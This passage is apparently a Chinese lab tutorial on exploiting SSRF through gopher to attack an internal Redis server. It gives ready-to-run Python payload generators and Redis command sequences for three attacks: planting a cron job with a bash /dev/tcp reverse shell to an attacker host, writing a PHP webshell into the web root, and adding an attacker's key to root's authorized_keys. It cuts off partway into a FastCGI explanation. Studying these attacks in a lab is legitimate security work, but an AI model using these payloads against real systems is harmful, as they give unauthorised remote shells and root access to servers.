###  Redis发送的数据
这个不知道为啥做不出来，嫖了一下图:joy:
有如下环境
> 0.101 攻击者  
>  0.100 redis 服务器  
>  0.104 web 服务器
首先要搞清楚访问 redis 时每次发送的数据是怎样的，所以先用 `socat` 监听 4444 端口，将 redis 的 6379 端口转发至 4444
来监听 gopher 访问 redis 的流量：
    // redis 服务器执行$ socat -v tcp-listen:4444,fork tcp-connect:192.168.0.100:6379
然后在攻击机 `redis-cli` 连接 redis 服务器的 4444 端口，运行一些常见指令，这里 redis 的密码是 123456。
命令依次是输入密码、显示所有键，输出 `name` 键的值。
查看 redis 服务器，得到的回显如下：
那么，如果我们构造 gopher 的 `DATA` 也是这种格式的话，就可以获取到数据。借助 web 服务器利用 SSRF 就可以达到攻击内网 redis
的目的。
但是！实战中最好一次一条指令，url 过长会导致抛出 `UnicodeError: label empty or too long`的异常
> PS：其实我总结一下很简单..:joy_cat:
>
> 每次发的命令字符串都是以空格为分隔符被分成数组，比如auth 123456就变成[‘auth’,’123456’]
>
> 第一行是*+数组长度
>
> 然后就是\$+字符串长度，比如auth长度为四，那么第一行就是\$4，第二行就是auth
>
> 123456长度为六，第一行就是\$6，第二行就是123456
###  攻击：写进定时任务
**必须用Centos起Redis，权限问题；不然无法反弹**
攻击机发送给有SSRF的Win2003，IP见虚拟机环境
主要靠下面几条Redis命令
    flushallset 1 '\n\n*/1 * * * * bash -i >& /dev/tcp/反弹IP/反弹端口 0>&1\n\n'config set dir /var/spool/cron/config set dbfilename rootsave
> 第一条是清空Redis所有数据
>
> 第二条设置键名为1，键值为反弹shell
>
> 第三条设置Redis文件存储目录为Centos下的计划任务目录
>
> 第四条设置Redis存储文件名
>
> 第五条保存设置
根据命令，自写计划任务反弹Shell的py脚本，参数你们都看得懂= =
    import urllib.parseprotocol="gopher://"ip="192.168.0.129"port="6379"reverse_ip="192.168.0.132"reverse_port="2333"cron="\n\n\n\n*/1 * * * * bash -i >& /dev/tcp/%s/%s 0>&1\n\n\n\n"%(reverse_ip,reverse_port)filename="root"path="/var/spool/cron"passwd=""cmd=["flushall",     "set 1 {}".format(cron.replace(" ","${IFS}")),     "config set dir {}".format(path),     "config set dbfilename {}".format(filename),     "save"     ]if passwd:    cmd.insert(0,"AUTH {}".format(passwd))payload=protocol+ip+":"+port+"/_"def redis_format(arr):    CRLF="\r\n"    redis_arr = arr.split(" ")    cmd=""    cmd+="*"+str(len(redis_arr))    for x in redis_arr:        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")    cmd+=CRLF    return cmdif __name__=="__main__":    for x in cmd:        payload += urllib.parse.quote(redis_format(x))    payload=urllib.parse.quote(payload)    with open('Result.txt','w') as f:        f.write(payload)    with open("Result.txt","r") as f:        for line in f.readlines():            print(line.strip())
发送！
Centos就能看见产生了计划任务
Kali也接收到了反弹Shell
URL二次解码后，能看到传过去的命令
**_第二次虚拟环境_**
**攻击机 192.168.0.128**
**Win_2003 192.168.0.130**
**Centos 192.168.0.141**
**Kali 192.168.0.132**
**Ubuntu 192.168.0.142**
###  攻击：绝对路径写Webshell
当然这个很少见了，开Redis的内网服务器会开Web服务么= =
需要执行的Redis命令如下
    flushallset 1 ''config set dir /var/www/htmlconfig set dbfilename shell.phpsave
然后生成命令的脚本
    import urllib.parseprotocol="gopher://"ip="192.168.0.141"port="6379"shell="\n\n\n\n"filename="shell.php"path="/var/www/"passwd=""cmd=["flushall",     "set 1 {}".format(shell.replace(" ","${IFS}")),     "config set dir {}".format(path),     "config set dbfilename {}".format(filename),     "save"     ]if passwd:    cmd.insert(0,"AUTH {}".format(passwd))payload=protocol+ip+":"+port+"/_"def redis_format(arr):    CRLF="\r\n"    redis_arr = arr.split(" ")    cmd=""    cmd+="*"+str(len(redis_arr))    for x in redis_arr:        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")    cmd+=CRLF    return cmdif __name__=="__main__":    for x in cmd:        payload += urllib.parse.quote(redis_format(x))    payload=urllib.parse.quote(payload)    with open('Result.txt','w') as f:        f.write(payload)    with open("Result.txt","r") as f:        for line in f.readlines():            print(line.strip())
然后发包
已经写入了Web目录~
###  攻击：写入SSH公钥
使用`ssh-keygen -t
rsa`生成公钥和私钥。RSA加密算法就是公钥加密，私钥解密；所以我们要把公钥给服务器，然后用自己私钥登录即可。（如果redis那台服务器没有目录的话一定要想办法生成好，不然会报路径错误）
我们需要执行老样子的Redis命令
    flushallset 1 '公钥'config set dir /root/.ssh/config set dbfilename authorized_keyssave
还是老样子的脚本
    import urllib.parseprotocol="gopher://"ip="192.168.0.141"port="6379"ssh_pub="ssh-rsa AAAAB3NzaC1yc2EAAAADAQ"+\    "ABAAABAQC8YIKqm8JZRdoi2FCY97+fNp+lT"+\    "CEwoPPoBGOKLLWYeeKsm3gRNy7kmHx1IHhsm"+\    "yIknEcbQCciBx41Ln+1SIbEqYVFksHNxk8xG"+\    "iaxjsUOYATqQ1Lkq/ZMxKAzpq08uGp17URbJmv3JtuKEkHPdEHDqvBQJLUVJCCvAm86Yer8y663BFxRv5AXwSkCYquL"+\    "P7XvG6yyYATdoRPJCdqjTtsGIlpJOH4gMfEhZOxKsLzwZJIWYose2BEA1REM7Nfxx2Oqva/hSErf5RqXgXXSWC3/jBlz"+\    "P2xof1a4CDRL9LoKLLTwUFQKWSMfnjMKYH3+uZIg4MyUAdWWwubEhpS6lpJd wzf@wzf-virtual-machine"filename="authorized_keys"path="/root/.ssh/"passwd=""cmd=["flushall",     "set 1 {}".format(ssh_pub.replace(" ","${IFS}")),     "config set dir {}".format(path),     "config set dbfilename {}".format(filename),     "save"     ]if passwd:    cmd.insert(0,"AUTH {}".format(passwd))payload=protocol+ip+":"+port+"/_"def redis_format(arr):    CRLF="\r\n"    redis_arr = arr.split(" ")    cmd=""    cmd+="*"+str(len(redis_arr))    for x in redis_arr:        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")    cmd+=CRLF    return cmdif __name__=="__main__":    for x in cmd:        payload += urllib.parse.quote(redis_format(x))    payload=urllib.parse.quote(payload)    with open('Result.txt','w') as f:        f.write(payload)    with open("Result.txt","r") as f:        for line in f.readlines():            print(line.strip())
出现这个就说明写入成功了
然后SSH连接即可
## FAST-CGI攻击
###  CGI
Apache和PHP有很多交互方式，主要有module、cgi和fastcgi模式三种
CGI模式下，此时 php 是一个独立的进程比如 php-cgi.exe，web 服务器也是一个独立的进程比如 apache.exe，然后当 Web
服务器监听到 HTTP 请求时，会去调用 php-cgi 进程，他们之间通过 cgi 协议，服务器把请求内容转换成 php-cgi 能读懂的协议数据传递给
cgi 进程，cgi 进程拿到内容就会去解析对应 php 文件，得到的返回结果在返回给 web 服务器，最后 web
服务器返回到客户端，但随着网络技术的发展，CGI 方式的缺点也越来越突出。每次客户端请求都需要建立和销毁进程。因为 HTTP
要生成一个动态页面，系统就必须启动一个新的进程以运行 CGI 程序，不断地 fork 是一项很消耗时间和资源的工作。
###  FASTCGI
**概述**
fastcgi 本身是一个协议，在 cgi 协议上进行了一些优化，众所周知，CGI 进程的反复加载是 CGI 性能低下的主要原因，如果 CGI
解释器保持在内存中 并接受 FastCGI 进程管理器调度，则可以提供良好的性能、伸缩性、Fail-Over 特性等等。 简而言之，CGI 模式是
apache2 接收到请求去调用 CGI 程序，而 fastcgi 模式是 fastcgi 进程自己管理自己的 cgi 进程，而不再是 apache